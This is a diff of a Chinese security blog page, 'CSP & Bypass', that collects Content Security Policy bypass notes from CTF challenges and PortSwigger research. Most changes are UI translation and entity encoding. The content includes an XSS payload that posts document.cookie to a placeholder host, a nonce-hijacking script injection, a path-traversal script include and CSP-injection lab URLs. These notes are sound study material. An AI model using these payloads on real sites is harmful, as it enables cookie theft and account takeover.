@@ -26,7 +26,7 @@
 <meta property="og:site_name" content="Threezh1&#39;s blog">
 <meta property="og:description" content="&amp;#x8FD9;&amp;#x90E8;&amp;#x5206;&amp;#x662F;&amp;#x4ECE;&amp;#x5176;&amp;#x4ED6;&amp;#x5E08;&amp;#x5085;&amp;#x4EEC;&amp;#x7684;&amp;#x6587;&amp;#x7AE0;&amp;#x91CC;&amp;#x6458;&amp;#x6284;&amp;#x7684;&amp;#x7B14;&amp;#x8BB0;&amp;#x4E0E;&amp;#x4E00;&amp;#x4E9B;&amp;#x5176;&amp;#x4ED6;&amp;#x5185;">
 <meta property="og:locale" content="Chinese">
-<meta property="og:updated_time" content="2020-04-30T08:04:21.444Z">
+<meta property="og:updated_time" content="2020-04-30T08:16:24.611Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CSP &amp; Bypass">
 <meta name="twitter:description" content="&amp;#x8FD9;&amp;#x90E8;&amp;#x5206;&amp;#x662F;&amp;#x4ECE;&amp;#x5176;&amp;#x4ED6;&amp;#x5E08;&amp;#x5085;&amp;#x4EEC;&amp;#x7684;&amp;#x6587;&amp;#x7AE0;&amp;#x91CC;&amp;#x6458;&amp;#x6284;&amp;#x7684;&amp;#x7B14;&amp;#x8BB0;&amp;#x4E0E;&amp;#x4E00;&amp;#x4E9B;&amp;#x5176;&amp;#x4ED6;&amp;#x5185;">
@@ -100,13 +100,13 @@
         
         <div class="navbar-menu navbar-end">
             
-            <a class="navbar-item search" title="Chercher" href="javascript:;">
+            <a class="navbar-item search" title="Suche" href="javascript:;">
                 <i class="fas fa-search"></i>
             </a>
             
             
             <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
-                <a class="navbar-item" title="Table des Matières">
+                <a class="navbar-item" title="Inhaltsverzeichnis">
                     <i class="fa fa-list"></i>
                 </a>
                 <div class="navbar-dropdown is-right">
@@ -218,6 +218,20 @@
                     
                     <a class="navbar-item" href="#利用浏览器补全">6.8&nbsp;&nbsp;利用浏览器补全</a>
                     
+                    
+                    
+                    <a class="navbar-item" href="#本地文件包含导致绕过">6.9&nbsp;&nbsp;本地文件包含导致绕过</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#CSP注入导致的绕过">6.10&nbsp;&nbsp;CSP注入导致的绕过</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#参考：">7&nbsp;&nbsp;<b>参考：</b></a>
+                    
                 </div>
             </div>
             
@@ -255,7 +269,7 @@
         <span class="column is-narrow">
             
             
-            18 minutes lire (À propos 2631 mots)
+            18 minutes lesen (Über 2631 Wörter)
         </span>
         
     </div>
@@ -396,65 +410,65 @@
 <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-role=popup id=&apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
 
 <p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
-<h3 id="&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;"><a href="#&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;" class="headerlink" title="&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;"></a>&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;</h3><p>&#x6709;&#x4E9B;&#x7F51;&#x7AD9;&#x9650;&#x5236;&#x53EA;&#x6709;&#x67D0;&#x4E9B;&#x811A;&#x672C;&#x624D;&#x80FD;&#x4F7F;&#x7528;&#xFF0C;&#x5F80;&#x5F80;&#x4F1A;&#x4F7F;&#x7528;<script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-abc&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;"><a href="#&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;" class="headerlink" title="&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;"></a>&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8865;&#x5168;</h3><p>&#x6709;&#x4E9B;&#x7F51;&#x7AD9;&#x9650;&#x5236;&#x53EA;&#x6709;&#x67D0;&#x4E9B;&#x811A;&#x672C;&#x624D;&#x80FD;&#x4F7F;&#x7528;&#xFF0C;&#x5F80;&#x5F80;&#x4F1A;&#x4F7F;&#x7528;<code>&lt;script&gt;</code>&#x6807;&#x7B7E;&#x7684;nonce&#x5C5E;&#x6027;&#xFF0C;&#x53EA;&#x6709;nonce&#x4E00;&#x81F4;&#x7684;&#x811A;&#x672C;&#x624D;&#x751F;&#x6548;&#xFF0C;&#x6BD4;&#x5982;CSP&#x8BBE;&#x7F6E;&#x6210;&#x4E0B;&#x9762;&#x8FD9;&#x6837;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-abc&apos;</span><br></pre></td></tr></table></figure>
 
-<p>那么当脚本插入点为如下的情况时:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;/p&gt;</span><br><span class="line">&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>&#x90A3;&#x4E48;&#x5F53;&#x811A;&#x672C;&#x63D2;&#x5165;&#x70B9;&#x4E3A;&#x5982;&#x4E0B;&#x7684;&#x60C5;&#x51B5;&#x65F6;:</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&#x63D2;&#x5165;&#x70B9;&lt;/p&gt;</span><br><span class="line">&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<p>可以插入:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//14.rs a=&quot;</span><br></pre></td></tr></table></figure>
+<p>&#x53EF;&#x4EE5;&#x63D2;&#x5165;:</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//14.rs a=&quot;</span><br></pre></td></tr></table></figure>
 
-<p>这样会拼成一个新的script标签，其中的src可以自由设定</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;</span><br><span class="line">&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>&#x8FD9;&#x6837;&#x4F1A;&#x62FC;&#x6210;&#x4E00;&#x4E2A;&#x65B0;&#x7684;script&#x6807;&#x7B7E;&#xFF0C;&#x5176;&#x4E2D;&#x7684;src&#x53EF;&#x4EE5;&#x81EA;&#x7531;&#x8BBE;&#x5B9A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;</span><br><span class="line">&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="本地文件包含导致绕过"><a href="#本地文件包含导致绕过" class="headerlink" title="本地文件包含导致绕过"></a>本地文件包含导致绕过</h3><p>当csp都是self时，可以通过上传本地文件，然后进行包含。</p>
+<h3 id="&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x5BFC;&#x81F4;&#x7ED5;&#x8FC7;"><a href="#&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x5BFC;&#x81F4;&#x7ED5;&#x8FC7;" class="headerlink" title="&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x5BFC;&#x81F4;&#x7ED5;&#x8FC7;"></a>&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x5BFC;&#x81F4;&#x7ED5;&#x8FC7;</h3><p>&#x5F53;csp&#x90FD;&#x662F;self&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E0A;&#x4F20;&#x672C;&#x5730;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x5305;&#x542B;&#x3002;</p>
 <ul>
 <li>cctf 2016</li>
 </ul>
-<p>通过后台上传了一个swf。(但是这里我一直没有复现成功，可能是浏览器版本的缘故。)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CWS</span><br><span class="line">&lt;script&gt;var xml = new XMLHttpRequest(); xml.open(&apos;POST&apos;, &apos;http://xss.xxxxx.cc&apos;, true); xml.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xml.send(&apos;cookie=&apos;+document.cookie); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>&#x901A;&#x8FC7;&#x540E;&#x53F0;&#x4E0A;&#x4F20;&#x4E86;&#x4E00;&#x4E2A;swf&#x3002;(&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x6211;&#x4E00;&#x76F4;&#x6CA1;&#x6709;&#x590D;&#x73B0;&#x6210;&#x529F;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x7248;&#x672C;&#x7684;&#x7F18;&#x6545;&#x3002;)</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CWS</span><br><span class="line">&lt;script&gt;var xml = new XMLHttpRequest(); xml.open(&apos;POST&apos;, &apos;http://xss.xxxxx.cc&apos;, true); xml.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xml.send(&apos;cookie=&apos;+document.cookie); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&apos;import&apos; href=&apos;/upload/xxxxx&apos;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&apos;import&apos; href=&apos;/upload/xxxxx&apos;&gt;</span><br></pre></td></tr></table></figure>
 
-<p>hctf 2016：</p>
-<p>题目csp限制只能在static加载js，把文件上传到upload目录，通过%2f跨目录加载。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=&quot;http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c&quot;&gt;&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure>
+<p>hctf 2016&#xFF1A;</p>
+<p>&#x9898;&#x76EE;csp&#x9650;&#x5236;&#x53EA;&#x80FD;&#x5728;static&#x52A0;&#x8F7D;js&#xFF0C;&#x628A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5230;upload&#x76EE;&#x5F55;&#xFF0C;&#x901A;&#x8FC7;%2f&#x8DE8;&#x76EE;&#x5F55;&#x52A0;&#x8F7D;&#x3002;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=&quot;http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c&quot;&gt;&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="CSP注入导致的绕过"><a href="#CSP注入导致的绕过" class="headerlink" title="CSP注入导致的绕过"></a>CSP注入导致的绕过</h3><p>当CSP中的内容是可控的内容时，可以通过下面两种方式绕过：</p>
+<h3 id="CSP&#x6CE8;&#x5165;&#x5BFC;&#x81F4;&#x7684;&#x7ED5;&#x8FC7;"><a href="#CSP&#x6CE8;&#x5165;&#x5BFC;&#x81F4;&#x7684;&#x7ED5;&#x8FC7;" class="headerlink" title="CSP&#x6CE8;&#x5165;&#x5BFC;&#x81F4;&#x7684;&#x7ED5;&#x8FC7;"></a>CSP&#x6CE8;&#x5165;&#x5BFC;&#x81F4;&#x7684;&#x7ED5;&#x8FC7;</h3><p>&#x5F53;CSP&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x662F;&#x53EF;&#x63A7;&#x7684;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#x7ED5;&#x8FC7;&#xFF1A;</p>
 <ul>
-<li>破坏CSP的方法（Edge浏览器）</li>
+<li>&#x7834;&#x574F;CSP&#x7684;&#x65B9;&#x6CD5;&#xFF08;Edge&#x6D4F;&#x89C8;&#x5668;&#xFF09;</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSP: script-src &apos;none&apos;; report-uri /test;_</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSP: script-src &apos;none&apos;; report-uri /test;_</span><br></pre></td></tr></table></figure>
 
-<p><code>test;_</code>是能够控制的内容。当CSP语句被破坏时，Edge浏览器会放弃整个CSP策略。</p>
-<p>文章中给了一个很短的payload：<code>;_</code></p>
-<p>实例地址：<a href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E">http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E</a>)</p>
+<p><code>test;_</code>&#x662F;&#x80FD;&#x591F;&#x63A7;&#x5236;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x5F53;CSP&#x8BED;&#x53E5;&#x88AB;&#x7834;&#x574F;&#x65F6;&#xFF0C;Edge&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x653E;&#x5F03;&#x6574;&#x4E2A;CSP&#x7B56;&#x7565;&#x3002;</p>
+<p>&#x6587;&#x7AE0;&#x4E2D;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x5F88;&#x77ED;&#x7684;payload&#xFF1A;<code>;_</code></p>
+<p>&#x5B9E;&#x4F8B;&#x5730;&#x5740;&#xFF1A;<a href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E" target="_blank" rel="noopener">http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E</a>)</p>
 <ul>
-<li>script-src-elem重写规则绕过</li>
+<li>script-src-elem&#x91CD;&#x5199;&#x89C4;&#x5219;&#x7ED5;&#x8FC7;</li>
 </ul>
-<p>例子：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src-elem &apos;none&apos;; script-src-attr &apos;unsafe-inline&apos;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(&quot;This will be blocked&quot;)&lt;/script&gt;</span><br><span class="line">&lt;a href=&quot;#&quot; onclick=&quot;alert(&apos;This will be allowed&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>&#x4F8B;&#x5B50;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src-elem &apos;none&apos;; script-src-attr &apos;unsafe-inline&apos;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(&quot;This will be blocked&quot;)&lt;/script&gt;</span><br><span class="line">&lt;a href=&quot;#&quot; onclick=&quot;alert(&apos;This will be allowed&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
 
-<p>实例地址：<a href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&amp;y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E">script-src-elem重写规则绕过</a></p>
-<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul>
-<li><a href="https://lorexxar.cn/2016/08/08/ccsp/#%E4%BB%80%E4%B9%88%E6%98%AFCSP">CSP Level 3浅析&amp;简单的bypass</a></li>
-<li><a href="https://portswigger.net/research/bypassing-csp-with-policy-injection">Bypassing CSP with policy injection</a></li>
-<li><a href="https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html">csp学习</a></li>
-<li><a href="https://xz.aliyun.com/t/318/">初探CSPBypass一些细节总结</a></li>
-<li><a href="https://xz.aliyun.com/t/7372">csp绕过姿势</a></li>
+<p>&#x5B9E;&#x4F8B;&#x5730;&#x5740;&#xFF1A;<a href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&amp;y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E" target="_blank" rel="noopener">script-src-elem&#x91CD;&#x5199;&#x89C4;&#x5219;&#x7ED5;&#x8FC7;</a></p>
+<h2 id="&#x53C2;&#x8003;&#xFF1A;"><a href="#&#x53C2;&#x8003;&#xFF1A;" class="headerlink" title="&#x53C2;&#x8003;&#xFF1A;"></a>&#x53C2;&#x8003;&#xFF1A;</h2><ul>
+<li><a href="https://lorexxar.cn/2016/08/08/ccsp/#%E4%BB%80%E4%B9%88%E6%98%AFCSP" target="_blank" rel="noopener">CSP Level 3&#x6D45;&#x6790;&amp;&#x7B80;&#x5355;&#x7684;bypass</a></li>
+<li><a href="https://portswigger.net/research/bypassing-csp-with-policy-injection" target="_blank" rel="noopener">Bypassing CSP with policy injection</a></li>
+<li><a href="https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html" target="_blank" rel="noopener">csp&#x5B66;&#x4E60;</a></li>
+<li><a href="https://xz.aliyun.com/t/318/" target="_blank" rel="noopener">&#x521D;&#x63A2;CSPBypass&#x4E00;&#x4E9B;&#x7EC6;&#x8282;&#x603B;&#x7ED3;</a></li>
+<li><a href="https://xz.aliyun.com/t/7372" target="_blank" rel="noopener">csp&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;</a></li>
 </ul>
-<p>两个方便CSP测试的网址：</p>
+<p>&#x4E24;&#x4E2A;&#x65B9;&#x4FBF;CSP&#x6D4B;&#x8BD5;&#x7684;&#x7F51;&#x5740;&#xFF1A;</p>
 <ul>
-<li>CSP生成：<a href="https://www.cspisawesome.com/">https://www.cspisawesome.com/</a></li>
-<li>CSP分析：<a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a></li>
+<li>CSP&#x751F;&#x6210;&#xFF1A;<a href="https://www.cspisawesome.com/" target="_blank" rel="noopener">https://www.cspisawesome.com/</a></li>
+<li>CSP&#x5206;&#x6790;&#xFF1A;<a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a></li>
 </ul>
-<p>总结是永远总结不完的，这里只贴地址了：</p>
+<p>&#x603B;&#x7ED3;&#x662F;&#x6C38;&#x8FDC;&#x603B;&#x7ED3;&#x4E0D;&#x5B8C;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x8D34;&#x5730;&#x5740;&#x4E86;&#xFF1A;</p>
 <ul>
-<li><a href="https://xz.aliyun.com/t/7530">如何将JavaScript隐藏在PNG图像中来绕过CSP</a></li>
-<li><a href="https://xz.aliyun.com/t/7108">CSP:trusted-types 初体验</a></li>
+<li><a href="https://xz.aliyun.com/t/7530" target="_blank" rel="noopener">&#x5982;&#x4F55;&#x5C06;JavaScript&#x9690;&#x85CF;&#x5728;PNG&#x56FE;&#x50CF;&#x4E2D;&#x6765;&#x7ED5;&#x8FC7;CSP</a></li>
+<li><a href="https://xz.aliyun.com/t/7108" target="_blank" rel="noopener">CSP:trusted-types &#x521D;&#x4F53;&#x9A8C;</a></li>
 </ul>
-</script></p>
+
     
     </div>
     
@@ -672,7 +686,7 @@ document.addEventListener("DOMContentLoaded", function() {
     <div class="searchbox-mask"></div>
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Que voulez-vous chercher ?">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Suche etwas...">
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -685,10 +699,10 @@ document.addEventListener("DOMContentLoaded", function() {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
                 POSTS: 'Posts',
-                PAGES: 'Pages',
-                CATEGORIES: 'Catégories',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
                 TAGS: 'Tags',
-                UNTITLED: '(Sans Titre)',
+                UNTITLED: '(Untitled)',
             },
             CONTENT_URL: '/content.json',
         };
